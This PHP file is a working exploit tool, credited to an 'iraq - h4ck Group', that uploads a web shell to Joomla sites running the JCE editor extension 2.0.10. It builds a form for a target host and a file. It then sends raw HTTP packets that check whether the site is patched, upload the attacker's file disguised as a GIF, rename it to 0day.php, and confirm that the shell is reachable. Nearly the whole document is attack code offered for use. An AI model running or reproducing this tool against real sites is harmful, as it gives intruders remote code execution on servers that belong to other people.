<?php 
######################################### www.bugreport.ir ######################################## 
# 
#                     iraq - h4ck Group 
# 
# 
# Title:                  (Auto Shell Uploader in joomla) V0.1 - PHP Version Version 
# Vendor:                 http://www.joomlacontenteditor.net 
# Vulnerable Version:     JCE 2.0.10 (prior versions also may be affected) 
# Exploitation:           Remote with browser 
# Original Advisory:      http://www.bugreport.ir/index_78.htm 
# Vendor supplied patch:  http://www.joomlacontenteditor.net/news/item/jce-2011-released 
# CVSS2 Base Score:       (AV:N/AC:L/Au:N/C:P/I:P/A:P) --> 7.5         
# Coded By:               iraqi h4ck 
################################################################################################### 
 
error_reporting(0); 
ini_set("max_execution_time",0); 
ini_set("default_socket_timeout", 2); 
ob_implicit_flush (1); 
 
echo'<html> 
<head> 
<title>JCE Joomla Extension Remote File Upload</title> 
</head> 
 
<body bgcolor="#00000"> 
 
<p align="center"><font size="4" color="#00ff00">JCE Joomla Extension Remote File Upload</font></p> 
</font> 
<table width="90%"> 
  <tbody> 
    <tr> 
      <td width="43%" align="left"> 
        <form name="form1" action="'.$SERVER[PHP_SELF].'" enctype="multipart/form-data"  method="post"> 
          <p></font><font color="#00ff00" > hostname (ex:www.sitename.com):    </font><input name="host" size="20"> <span class="Stile5"><font color="#FF0000">*</span></p> 
          <p></font><font color="#00ff00" > path (ex: /joomla/ or just / ):            </font><input name="path" size="20"> <span class="Stile5"><font color="#FF0000">*</span></p> 
          <p></font><font color="#00ff00" >Please specify a file to upload:           </font><input type="file" name="datafile" size="40"><font color="#FF0000"> * </font> 
          <p><font color="#00ff00" >  specify a port (default is 80):             </font><input name="port" size="20"><span class="Stile5"></span></p> 
          <p><font color="#00ff00" >  Proxy (ip:port):                                 </font><input name="proxy" size="20"><span class="Stile5"></span></p> 
          <p align="center"> <span class="Stile5"><font color="#FF0000">* </font><font color="white" >fields are required</font></font></span></p> 
          <p><input type="submit" value="Start" name="Submit"></p> 
        </form> 
      </td> 
    </tr> 
  </tbody> 
</table> 
</body></html>'; 
 
function sendpacket($packet,$response = 0,$output = 0,$s=0) 
{ 
    $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; 
    global $proxy, $host, $port, $html, $user, $pass; 
    if ($proxy == '') 
    { 
        $ock = fsockopen($host,$port); 
        stream_set_timeout($ock, 5); 
        if (!$ock) 
        { 
            echo '<font color=white> No response from '.htmlentities($host).' ...<br></font>'; 
            die; 
        } 
    } else
    { 
        $parts = explode(':',$proxy); 
        echo '<font color=white>Connecting to proxy: '.$parts[0].':'.$parts[1].' ...<br><br/></font>'; 
        $ock   = fsockopen($parts[0],$parts[1]); 
        stream_set_timeout($ock, 5); 
        if (!$ock)  
        { 
            echo '<font color=white>No response from proxy...<br></font>'; 
            die; 
        } 
    } 
 
        fputs($ock,$packet); 
        if ($response == 1) 
        { 
            if ($proxy == '') 
            { 
                $html = ''; 
                while (!feof($ock)) 
                { 
                    $html .= fgets($ock); 
                } 
            } else
            { 
                $html = ''; 
                while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) 
                { 
                    $html .= fread($ock,1); 
                } 
            } 
        } else $html = ''; 
 
        fclose($ock); 
        if ($response == 1 && $output == 1) echo nl2br(htmlentities($html)); 
        if ($s==1){ 
        $count=0; 
        $res=nl2br(htmlentities($html)); 
        $str = array('2.0.11</title','2.0.12</title','2.0.13</title','2.0.14</title','2.0.15</title','1.5.7.10</title','1.5.7.11</title','1.5.7.12</title','1.5.7.13</title','1.5.7.14</title');
        foreach ($str as $value){ 
        $pos = strpos($res, $value); 
        if ($pos === false) { 
        $count=$count++; 
        } else { 
        echo "<font color=white>Target patched.<br/><br/></font>"; 
        die(); 
        } 
        } 
        if ($count=10) echo '<font color=white>Target is exploitable.<br/><br/></font>'; 
        } 
} 
 
  $host   = $_POST['host']; 
  $path   = $_POST['path']; 
  $port   = $_POST['port'];  
  $proxy   = $_POST['proxy'];  
      
if (isset($_POST['Submit']) && $host != '' && $path != '') 
{ 
    
  $port=intval(trim($port)); 
  if ($port=='') {$port=80;} 
  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die('<font color=white>Error... check the path!</font>');} 
  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;} 
  $host=str_replace("\r\n","",$host); 
  $path=str_replace("\r\n","",$path); 
    
 
                                                  /* Packet 1 --> Checking Exploitability */
            $packet  = "GET ".$p."/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1\r\n"; 
            $packet .= "Host: ".$host."\r\n"; 
            $packet .= "User-Agent: BOT/0.1 (BOT for JCE) \r\n\r\n\r\n\r\n"; 
              
            sendpacket($packet,1,0,1); 
   
                                        /* Packet 2 --> Uploading shell as a gif file */
                                           
            $content = "GIF89a1\n"; 
            $content .= file_get_contents($_FILES['datafile']['tmp_name']); 
            $data    = "-----------------------------41184676334\r\n"; 
            $data   .= "Content-Disposition: form-data; name=\"upload-dir\"\r\n\r\n"; 
            $data   .= "/\r\n"; 
            $data   .= "-----------------------------41184676334\r\n"; 
            $data   .= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"\"\r\n"; 
            $data   .= "Content-Type: application/octet-stream\r\n\r\n\r\n"; 
            $data   .= "-----------------------------41184676334\r\n"; 
            $data   .= "Content-Disposition: form-data; name=\"upload-overwrite\"\r\n\r\n"; 
            $data   .= "0\r\n"; 
            $data   .= "-----------------------------41184676334\r\n"; 
            $data   .= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"0day.gif\"\r\n"; 
            $data   .= "Content-Type: image/gif\r\n\r\n"; 
            $data   .= "$content\r\n"; 
            $data   .= "-----------------------------41184676334\r\n"; 
            $data   .= "0day\r\n"; 
            $data   .= "-----------------------------41184676334\r\n"; 
            $data   .= "Content-Disposition: form-data; name=\"action\"\r\n\r\n"; 
            $data   .= "upload\r\n"; 
            $data   .= "-----------------------------41184676334--\r\n\r\n\r\n\r\n"; 
            $packet  = "POST ".$p."/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=9d09f693c63c1988a9f8a564e0da7743 HTTP/1.1\r\n"; 
            $packet .= "Host: ".$host."\r\n"; 
            $packet .= "User-Agent: BOT/0.1 (BOT for JCE)\r\n"; 
            $packet .= "Content-Type: multipart/form-data; boundary=---------------------------41184676334\r\n"; 
            $packet .= "Accept-Language: en-us,en;q=0.5\r\n"; 
            $packet .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"; 
            $packet .= "Cookie: 6bc427c8a7981f4fe1f5ac65c1246b5f=9d09f693c63c1988a9f8a564e0da7743; jce_imgmanager_dir=%2F; __utma=216871948.2116932307.1317632284.1317632284.1317632284.1; __utmb=216871948.1.10.1317632284; __utmc=216871948; __utmz=216871948.1317632284.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)\r\n"; 
            $packet .= "Connection: Close\r\n"; 
            $packet .= "Proxy-Connection: close\r\n"; 
            $packet .= "Content-Length: ".strlen($data)."\r\n\r\n\r\n\r\n"; 
            $packet .= $data; 
              
            sendpacket($packet,0,0,0); 
              
                                          /* Packet 3 --> Change Extension from .gif to .php */
                                          
                                          
            $packet  = "POST ".$p."/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1\r\n"; 
            $packet .= "Host: ".$host."\r\n"; 
            $packet .= "User-Agent: BOT/0.1 (BOT for JCE) \r\n"; 
            $packet .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"; 
            $packet .= "Accept-Language: en-US,en;q=0.8\r\n"; 
            $packet .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"; 
            $packet .= "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n"; 
            $packet .= "Accept-Encoding: deflate\n"; 
            $packet .= "X-Request: JSON\r\n"; 
            $packet .= "Cookie: __utma=216871948.2116932307.1317632284.1317639575.1317734968.3; __utmz=216871948.1317632284.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=216871948.20.10.1317734968; __utmc=216871948; jce_imgmanager_dir=%2F; 6bc427c8a7981f4fe1f5ac65c1246b5f=7df6350d464a1bb4205f84603b9af182\r\n"; 
            $ren ="json={\"fn\":\"folderRename\",\"args\":[\"/0day.gif\",\"0day.php\"]}"; 
            $packet .= "Content-Length: ".strlen($ren)."\r\n\r\n"; 
            $packet .= $ren."\r\n\r\n"; 
              
            sendpacket($packet,1,0,0); 
 
                                          /* Packet 4 --> Check for successfully uploaded */ 
                                          
                                          
            $packet  = "Head ".$p."/images/stories/0day.php HTTP/1.1\r\n"; 
            $packet .= "Host: ".$host."\r\n"; 
            $packet .= "User-Agent: BOT/0.1 (BOT for JCE) \r\n\r\n\r\n\r\n"; 
              
            sendpacket($packet,1,0,0); 
    
  if(stristr($html , '200 OK') != true) 
  {echo "<font color=white>Exploit Faild...</font>";} else echo "<font color=white>Exploit Succeeded...<br>http://$host:$port$path"."/images/stories/0day.php</font>";
} 
?> 
